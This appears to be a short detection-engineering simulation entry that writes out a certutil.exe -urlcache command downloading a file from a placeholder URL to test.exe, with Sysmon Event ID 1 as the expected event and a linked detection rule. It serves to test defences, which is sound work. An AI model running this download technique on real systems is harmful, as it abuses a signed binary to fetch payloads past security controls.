# Living-Off-The-Land Simulation

## Objective

Generate execution of a signed Windows binary.

## Command

```cmd
certutil.exe -urlcache -f https://example.com test.exe
```

## Expected Event

- Sysmon Event ID 1

## Detection Rule

11-Living-Off-The-Land.md
